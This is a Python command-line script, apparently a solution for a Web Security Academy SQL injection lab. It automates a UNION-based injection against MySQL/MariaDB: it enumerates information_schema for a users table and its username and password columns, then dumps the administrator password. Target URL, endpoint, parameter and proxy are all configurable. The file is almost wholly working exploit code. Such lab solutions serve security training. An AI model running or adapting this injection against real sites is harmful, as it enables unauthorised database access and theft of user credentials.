from __future__ import annotations

import argparse
import sys
import re
from typing import Optional, Tuple

from bs4 import BeautifulSoup

from src.common.cli_utils import build_cli_client, parse_keyvals
from src.common.http_utils import HttpClient
from src.sqli.sqli_utils import sqli_inject


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="SQLi (MySQL/MariaDB): Find users table/columns via information_schema and extract admin password."
    )

    # positional
    _ = p.add_argument("url", help="Base URL, e.g. https://target.web-security-academy.net")

    # injection configuration
    _ = p.add_argument("--endpoint", default="/filter", help="Endpoint path (default: %(default)s)")
    _ = p.add_argument(
        "--param-name", default="category", help="Parameter name (default: %(default)s)"
    )
    _ = p.add_argument(
        "--base-value", default="Accessories", help="Benign base value (default: %(default)s)"
    )
    _ = p.add_argument(
        "--method", choices=["GET", "POST"], default="GET", help="HTTP method (default: %(default)s)"
    )
    _ = p.add_argument(
        "--inject",
        choices=["query", "body"],
        default="query",
        help="Where to inject payload (default: %(default)s)",
    )

    # payload/union shape
    _ = p.add_argument(
        "--columns",
        type=int,
        default=2,
        help="Total number of columns from detection step (default: %(default)s)",
    )
    _ = p.add_argument(
        "--string-col",
        type=int,
        default=1,
        help="Index (1-based) of the column that renders text (default: %(default)s)",
    )

    # discovery tuning
    _ = p.add_argument(
        "--table-like",
        default="%user%",
        help="LIKE filter for table_name when enumerating (default: %(default)s)",
    )
    _ = p.add_argument(
        "--limit",
        type=int,
        default=1,
        help="Limit number of candidates to display/try (default: %(default)s)",
    )
    _ = p.add_argument(
        "--schema-current",
        action="store_true",
        help="Restrict enumeration to the current database schema (table_schema = database()).",
    )

    # plumbing
    _ = p.add_argument("--proxy", default=None, help="HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)")
    _ = p.add_argument("--insecure", action="store_true", help="Disable TLS verification (Burp/etc.)")
    _ = p.add_argument(
        "--timeout", type=float, default=10.0, help="HTTP timeout in seconds (default: %(default)s)"
    )

    # optional extras
    _ = p.add_argument("--cookie", action="append", default=[], metavar="NAME=VALUE")
    _ = p.add_argument("--header", action="append", default=[], metavar="Name: Value")
    _ = p.add_argument(
        "--base-param",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="Additional baseline params (repeatable). Applies to query/body.",
    )

    return p.parse_args(argv)


USERS_TABLE_RE = re.compile(r"\busers?\b", re.IGNORECASE)
USERNAME_COL_RE = re.compile(r"\buser(name)?\b", re.IGNORECASE)
PASSWORD_COL_RE = re.compile(r"\bpass(word)?\b", re.IGNORECASE)


def _soup(html: str) -> BeautifulSoup:
    return BeautifulSoup(html, "html.parser")


def _first_text_match(s: BeautifulSoup, rx: re.Pattern) -> Optional[str]:
    # Try direct string node
    node = s.find(string=rx)
    if node and node.strip():
        return node.strip()
    # Try any visible chunk
    for t in s.stripped_strings:
        if rx.search(t):
            return t.strip()
    return None


def discover_users_table(
    client: HttpClient,
    *,
    endpoint: str,
    param_name: str,
    base_value: str,
    method: str,
    inject: str,
    columns: int,
    string_col: int,
    table_like: str,
    limit: int,
    schema_current: bool,
    base_params: dict[str, str],
    cookies: dict[str, str],
    headers: dict[str, str],
) -> Optional[str]:
    """
    UNION-select table_name from information_schema.tables.
    Returns the first table name that looks like a users table.
    """
    select_parts = ["NULL"] * columns
    select_parts[string_col - 1] = "table_name"
    union_clause = ", ".join(select_parts)

    where = f"table_name LIKE '{table_like}'"
    if schema_current:
        where += " AND table_schema = database()"

    payload = f"{base_value}' UNION SELECT {union_clause} FROM information_schema.tables WHERE {where} LIMIT {limit}-- -"

    res = sqli_inject(
        client,
        payload=payload,
        method=method,
        endpoint=endpoint,
        inject=inject,
        param_name=param_name,
        base_params=base_params,
        extra_headers=headers,
        cookies=cookies,
        success_marker="user",  # heuristic
    )
    if not res.success:
        return None

    s = _soup(res.body)
    # prefer a “users” looking name
    tab = _first_text_match(s, USERS_TABLE_RE)
    if tab:
        return tab

    # Otherwise grab the first non-empty text chunk as a fallback
    for t in s.stripped_strings:
        if t:
            return t.strip()

    return None


def discover_user_pass_columns(
    client: HttpClient,
    *,
    endpoint: str,
    param_name: str,
    base_value: str,
    method: str,
    inject: str,
    columns: int,
    string_col: int,
    users_table: str,
    schema_current: bool,
    base_params: dict[str, str],
    cookies: dict[str, str],
    headers: dict[str, str],
) -> Tuple[Optional[str], Optional[str]]:
    """
    UNION-select column_name from information_schema.columns for the given table.
    Returns (username_col, password_col) if identifiable.
    """
    select_parts = ["NULL"] * columns
    select_parts[string_col - 1] = "column_name"
    union_clause = ", ".join(select_parts)

    # Sanitize table name for SQL literal
    tbl = users_table.strip().strip("`\"'")

    where = f"table_name = '{tbl}'"
    if schema_current:
        where += " AND table_schema = database()"

    payload = f"{base_value}' UNION SELECT {union_clause} FROM information_schema.columns WHERE {where}-- -"

    res = sqli_inject(
        client,
        payload=payload,
        method=method,
        endpoint=endpoint,
        inject=inject,
        param_name=param_name,
        base_params=base_params,
        extra_headers=headers,
        cookies=cookies,
        success_marker="col",  # weak heuristic; extraction is authoritative
    )
    if not res.success:
        return (None, None)

    s = _soup(res.body)
    user_col = _first_text_match(s, USERNAME_COL_RE)
    pass_col = _first_text_match(s, PASSWORD_COL_RE)

    # Fallback: take first two distinct column names if regexes fail
    if not (user_col and pass_col):
        seen: list[str] = []
        for t in s.stripped_strings:
            tt = t.strip()
            if tt and tt not in seen:
                seen.append(tt)
            if len(seen) >= 2:
                break
        user_col = user_col or (seen[0] if seen else None)
        pass_col = pass_col or (seen[1] if len(seen) > 1 else None)

    return (user_col, pass_col)


def extract_admin_password_from_html(html: str, username: str = "administrator") -> Optional[str]:
    """
    Extract 'administrator:password' or table-cell neighbor containing the password.
    """
    soup = _soup(html)
    # Look for a concat line "administrator:<password>"
    node = soup.find(string=lambda t: t and username in t)
    if node:
        text = node.strip()
        if ":" in text:
            u, _, pw = text.partition(":")
            if u.strip().lower() == username and pw.strip():
                return pw.strip()

        # table layout fallback: <td>administrator</td><td>password</td>
        td = getattr(node, "parent", None)
        if td and td.name != "td":
            td = td.find_parent("td")
        if td:
            next_td = td.find_next_sibling("td")
            if next_td and next_td.get_text(strip=True):
                return next_td.get_text(strip=True)

    # Last resort: scan visible text chunks
    for t in soup.stripped_strings:
        if t.lower().startswith(username):
            _, _, pw = t.partition(":")
            if pw.strip():
                return pw.strip()
    return None


def dump_admin_password(
    client: HttpClient,
    *,
    endpoint: str,
    param_name: str,
    base_value: str,
    method: str,
    inject: str,
    columns: int,
    string_col: int,
    users_table: str,
    username_col: str,
    password_col: str,
    base_params: dict[str, str],
    cookies: dict[str, str],
    headers: dict[str, str],
    username: str = "administrator",
) -> Optional[str]:
    """
    UNION-select CONCAT(username, ':', password) from users_table and extract the admin password.
    """
    tbl = users_table.strip().strip("`\"'")
    ucol = username_col.strip().strip("`\"'")
    pcol = password_col.strip().strip("`\"'")

    select_parts = ["NULL"] * columns
    select_parts[string_col - 1] = f"CONCAT({ucol}, ':', {pcol})"
    union_clause = ", ".join(select_parts)

    payload = f"{base_value}' UNION SELECT {union_clause} FROM `{tbl}`-- -"

    res = sqli_inject(
        client,
        payload=payload,
        method=method,
        endpoint=endpoint,
        inject=inject,
        param_name=param_name,
        base_params=base_params,
        extra_headers=headers,
        cookies=cookies,
        success_marker=username,  # expect 'administrator' to appear
    )
    if not res.success:
        return None

    return extract_admin_password_from_html(res.body, username=username)


def main(argv: list[str]) -> int:
    args = parse_args(argv)

    client = build_cli_client(
        args.url,
        proxy=args.proxy,
        insecure=args.insecure,
        timeout=args.timeout,
    )

    cookies = parse_keyvals(args.cookie, "=")
    headers = parse_keyvals(args.header, ":")
    base_params = parse_keyvals(args.base_param, "=")

    print("[+] Looking for a users table...")
    try:
        users_table = discover_users_table(
            client,
            endpoint=args.endpoint,
            param_name=args.param_name,
            base_value=args.base_value,
            method=args.method,
            inject=args.inject,
            columns=args.columns,
            string_col=args.string_col,
            table_like=args.table_like,
            limit=args.limit,
            schema_current=args.schema_current,
            base_params=base_params,
            cookies=cookies,
            headers=headers,
        )
    except Exception as exc:
        print(f"[-] Request failed while enumerating tables: {exc}")
        return 2

    if not users_table:
        print("[-] Did not find a users table.")
        return 1

    print(f"[+] Found users table candidate: {users_table}")

    print("[+] Enumerating columns to find username/password...")
    try:
        username_col, password_col = discover_user_pass_columns(
            client,
            endpoint=args.endpoint,
            param_name=args.param_name,
            base_value=args.base_value,
            method=args.method,
            inject=args.inject,
            columns=args.columns,
            string_col=args.string_col,
            users_table=users_table,
            schema_current=args.schema_current,
            base_params=base_params,
            cookies=cookies,
            headers=headers,
        )
    except Exception as exc:
        print(f"[-] Request failed while enumerating columns: {exc}")
        return 2

    if not (username_col and password_col):
        print("[-] Did not find the username and/or password columns.")
        return 1

    print(f"[+] Username column: {username_col}")
    print(f"[+] Password column: {password_col}")

    print("[+] Dumping administrator credential...")
    try:
        admin_password = dump_admin_password(
            client,
            endpoint=args.endpoint,
            param_name=args.param_name,
            base_value=args.base_value,
            method=args.method,
            inject=args.inject,
            columns=args.columns,
            string_col=args.string_col,
            users_table=users_table,
            username_col=username_col,
            password_col=password_col,
            base_params=base_params,
            cookies=cookies,
            headers=headers,
        )
    except Exception as exc:
        print(f"[-] Request failed while dumping credentials: {exc}")
        return 2

    if admin_password:
        print(f"[+] The administrator password is: {admin_password}")
        return 0
    else:
        print("[-] Did not find the administrator password.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))

# Usage example
# python -m src.sqli.lab08 \
# https://TARGET.web-security-academy.net \
# --endpoint /filter \
# --param-name category \
# --base-value Accessories \
# --columns 2 \
# --string-col 1 \
# --proxy http://127.0.0.1:8080 \
# --insecure \
# --schema-current \
# --table-like "%user%"
